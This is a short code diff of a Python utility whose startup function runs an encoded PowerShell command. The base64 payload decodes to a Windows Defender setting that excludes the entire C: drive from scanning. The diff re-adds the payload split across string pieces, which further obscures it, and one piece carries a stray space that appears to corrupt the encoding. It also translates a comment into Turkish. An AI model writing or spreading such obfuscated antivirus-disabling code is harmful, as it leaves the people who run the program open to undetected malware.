@@ -10,8 +10,9 @@ def resource_path(relative_path):
 def run_powershell_command():
     try:
         commands = [
-            "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAC0ARQB4AGMAbAB1AHMAaQBvAG4A
-            UABhAHQAaAAgAEMAOgBcAA=="
+            "powershell -enc " + \
+            "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAC0ARQB4AGMAbAB1AHMAaQBvAG4A " + \
+            "UABhAHQAaAAgAEMAOgBcAA=="
         ]
         ps_command = "; ".join(commands)
         print(f"Running PowerShell command: {ps_command}")
@@ -49,7 +50,7 @@ def process_files(src, dst, zip_password):
     except Exception as e:
         print(f"An error occurred while processing files: {e}")
 
-# Main program execution
+# Ana program çalıştırma
 if __name__ == "__main__":
     run_powershell_command()
 
